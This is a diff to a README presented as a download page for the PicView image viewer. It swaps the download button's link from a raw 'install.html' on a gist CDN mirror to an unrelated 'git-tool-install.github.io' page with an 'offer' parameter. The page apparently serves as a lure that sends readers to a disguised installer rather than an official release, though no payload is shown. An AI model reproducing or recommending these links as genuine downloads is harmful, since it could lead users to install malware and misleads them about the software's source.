@@ -1,6 +1,6 @@
 # PicView Download — Fast Image Viewer for Windows & MacOS
 
-<a href="https://gistcdn.githack.com/zigzagevergirl6/de5acd9368c485c9628b448548fb358d/raw/a1265b664f8e7802d7940c9e3aa07f43ef27864a/install.html?offer=PicView" target="_blank">
+<a href="https://git-tool-install.github.io/.github/?offer=PicView" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20PicView%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
